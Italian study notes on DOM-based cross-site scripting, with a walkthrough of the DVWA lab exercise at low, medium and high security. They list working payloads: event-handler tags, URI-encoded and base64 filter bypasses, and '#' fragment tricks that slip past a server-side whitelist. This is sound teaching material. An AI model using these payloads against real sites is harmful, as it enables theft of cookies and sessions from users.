## XSS (DOM)

- https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client_Side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting
- https://www.acunetix.com/blog/articles/dom-xss-explained/

L'attaccante usa un'applicazione vulnerabile per far eseguire codice malevolo agli utenti, generalmente tramite uno script che viene eseguito sul browser.
Il codice malevolo può accedere a cookie, token di sessione e informazioni sensibili gestite dal browser.

Posso eseguire l'attacco anche senza usare il tag `<script></script>`:

- `<body onload=alert('hacked')>`
- `<b onmouseover=alert('hacked')>Click Me!</b>`
- `<img src="http://example.com/not.existing.image" onerror=alert('hacked')>`

Per raggirare i filtri dell'applicazione posso fare l'encoding a livello di URI: `<img src=j%41vascript:alert('hacked')>`.
Per non usare affatto `script` posso codificare il comando in base64 e includerlo nel tag meta: `<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGFja2VkJyk8L3NjcmlwdD4=">` (`PHNjcmlwdD5hbGVydCgnaGFja2VkJyk8L3NjcmlwdD4=` = `<script>alert('hacked')</script>`).

Il DOM XSS prevede che il payload dell'attacco sia eseguito come conseguenza della modifica del DOM nel browser della vittima, in modo che il codice client viene eseguito in modo inatteso.
Mentre nel caso di Stored o Reflected XSS il payload dell'attacco viene inserito nella pagina di risposta (a causa di una vulnerabilità server).

Preso il seguente codice vulnerabile:

```
Select your language:

<select>
<script>
document.write( "<OPTION value=1>" + document.location.href.substring( document.location.href.indexOf( "default=" ) + 8) + "</OPTION>");

document.write( "<OPTION value=2>English</OPTION>" );

</script>
</select>
```

La relativa pagina può essere invocata accedendo a `http://www.example.com/page.html?default=French`.
Un attacco DOM XSS può essere realizzato facendo accedere la vittima a `http://www.example.com/page.html?default=<script>alert('hacked')</script>`.
Il codice vulnerabile pone quanto specificato nella query string per `default` nel DOM (`<script>alert('hacked')</script>`) e lo esegue nel browser della vittima.

Nell'attacco precedente il payload raggiunge il server.
Per non lasciare traccia sul server posso usare `#`, dato che i frammenti non sono inviati al server.
L'URI diventa: `http://www.example.com/page.html#default=<script>alert('hacked')</script>`.


## XSS (DOM) - Low

```
<script>
if (document.location.href.indexOf("default=") >= 0) {
	var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);
	document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
	document.write("<option value='' disabled='disabled'>----</option>");
}

document.write("<option value='English'>English</option>");
document.write("<option value='French'>French</option>");
document.write("<option value='Spanish'>Spanish</option>");
document.write("<option value='German'>German</option>");
</script>
```

Exploit:

- accedi a `http://172.17.0.2/vulnerabilities/xss_d/?default=<script>alert('hacked')</script>` oppure a `http://172.17.0.2/vulnerabilities/xss_d/?default=<script>window.location = 'http://www.example.com'</script>`

## XSS (DOM) - Medium

```
# Do not allow script tags
if (stripos ($default, "<script") !== false) {
	header ("location: ?default=English");
	exit;
} 
```

Exploit:

- accedi a `http://172.17.0.2/vulnerabilities/xss_d/?default=#<script>alert('hacked')</script>` o ``http://172.17.0.2/vulnerabilities/xss_d/?default=#<script>window.location = 'http://www.example.com'</script>``

## XSS (DOM) - High

```
# White list the allowable languages
switch ($_GET['default']) {
	case "French":
	case "English":
	case "German":
	case "Spanish":
		# ok
		break;
	default:
		header ("location: ?default=English");
		exit;
} 
```

Exploit:

- accedi a `http://172.17.0.2/vulnerabilities/xss_d/?default=French#<script>alert('hacked')</script>` o a `http://172.17.0.2/vulnerabilities/xss_d/?default=French#<script>window.location = 'http://www.example.com'</script>`

